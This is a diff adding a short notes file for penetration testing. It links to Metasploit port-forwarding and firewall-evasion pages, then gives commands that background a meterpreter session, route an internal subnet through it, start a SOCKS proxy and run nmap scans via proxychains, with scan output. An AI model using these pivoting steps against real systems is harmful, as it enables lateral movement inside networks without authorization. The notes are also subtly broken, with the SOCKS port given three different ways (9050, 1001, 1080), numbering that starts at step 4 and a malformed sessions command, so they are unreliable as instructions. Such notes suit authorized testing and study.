@@ -1,0 +1,36 @@
+https://help.ubuntu.com/community/SSH/OpenSSH/PortForwarding
+
+https://dev.metasploit.com/pipermail/framework/2013-February/008764.html
+
+https://dev.metasploit.com/pipermail/framework/attachments/20130223/01d6affc/attachment.html
+
+http://www.offensive-security.com/metasploit-unleashed/Portfwd
+
+http://sathisharthars.wordpress.com/2014/07/07/evade-windows-firewall-by-ssh-tunneling-using-metasploit/
+
+====
+# 4 To allow scanning via proxy using meterpreter session, put session to background
+
+meterpreter > background
+msf > sessions l
+msf > route add 192.168.17.0 255.255.255.0 <session number>
+
+# 5 add SOCKS proxy
+
+msf > use auxiliary/server/socks4a
+msf auxiliary(socks4a) > set SRVHOST 127.0.0.1
+msf auxiliary(socks4a) > set SRVPORT 9050
+msf auxiliary(socks4a) > run
+
+# 6 Update proxychains config
+
+socks4  127.0.0.1 1001
+
+# 7 run tools via proxychains
+
+proxychains nmap -sV --top-ports 1000 192.168.17.x
+
+Starting Nmap 6.47 ( http://nmap.org ) at 2014-10-21 21:46 PDT
+|S-chain|-<>-127.0.0.1:1080-<><>-192.168.17.xxx:21-<><>-OK
+|S-chain|-<>-127.0.0.1:1080-<><>-192.168.17.xxx:80-<><>-OK
+|S-chain|-<>-127.0.0.1:1080-<><>-192.168.17.xxx:3389-<><>-OK
